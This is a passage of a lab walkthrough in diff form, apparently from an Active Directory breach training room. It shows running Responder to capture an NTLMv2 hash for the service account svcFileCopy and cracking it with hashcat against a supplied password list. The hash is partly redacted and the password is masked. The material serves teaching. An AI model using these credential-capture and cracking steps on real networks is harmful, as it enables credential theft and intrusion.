@@ -363,4 +363,31 @@ When a client (e.g., a workstation or service) tries to authenticate using SMB, 
 Let's follow the steps:
 
 ```
+sudo responder -I breachad
+```
 
+It so happens that this task simulates an authentication request that runs once in 30 minutes, so we will need to wait for it for quite a bit to receive it. 
+
+After a bit of waiting, here's the output it showed:
+
+```
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.200.9.202
+[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
+[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:76d998cefda390b1:254A1AA [...] F9757F:01010000 [...] 000000
+```
+
+We save the entire response (`svcFileCopy` and onwards) to a file `hash.txt`. Now let's download the task file and crack it using the password list provided:
+
+```
+hashcat -m 5600 hash.txt passwords.txt --force
+```
+
+The output:
+
+```
+SVCFILECOPY::ZA:76d998cefda390b1:254a1aa38 [...] d7f9757f:010100000 [...] 000000:{***********}
+```
+
+We have the password!
